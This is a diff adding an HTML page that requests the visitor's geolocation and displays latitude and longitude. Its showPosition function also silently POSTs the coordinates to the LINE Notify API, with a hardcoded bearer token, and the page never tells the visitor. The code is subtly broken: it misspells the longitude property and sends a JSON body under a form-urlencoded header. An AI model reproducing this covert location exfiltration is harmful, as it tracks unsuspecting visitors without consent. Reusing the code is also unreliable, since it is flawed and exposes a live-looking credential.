@@ -1,0 +1,37 @@
+
+<html>
+<body>
+
+<p id="demo"></p>
+
+<script>
+var x = document.getElementById("demo");
+
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else { 
+    x.innerHTML = "Geolocation is not supported by this browser.";
+  }
+
+function showPosition(position) {
+  x.innerHTML = "Latitude: " + position.coords.latitude + 
+  "<br>Longitude: " + position.coords.longitude;
+
+  var xhr = new XMLHttpRequest();
+  var value =
+      {
+            "payload" : "message= " + position.coords.latitude+","+position.coords.longtitude,
+      }
+  xhr.open("POST", "https://notify-api.line.me/api/notify", true);
+  xhr.setRequestHeader('Authorization','Bearer 5MqXJaBoXJVI1FKZ63B46D8qNbZYQmYFO5WjTo4Govx');
+  xhr.setRequestHeader('content-type','application/x-www-form-urlencoded');
+  var s = xhr.send(JSON.stringify({
+    value: value
+}));
+  console.log(s);
+
+      };
+</script>
+
+</body>
+</html>
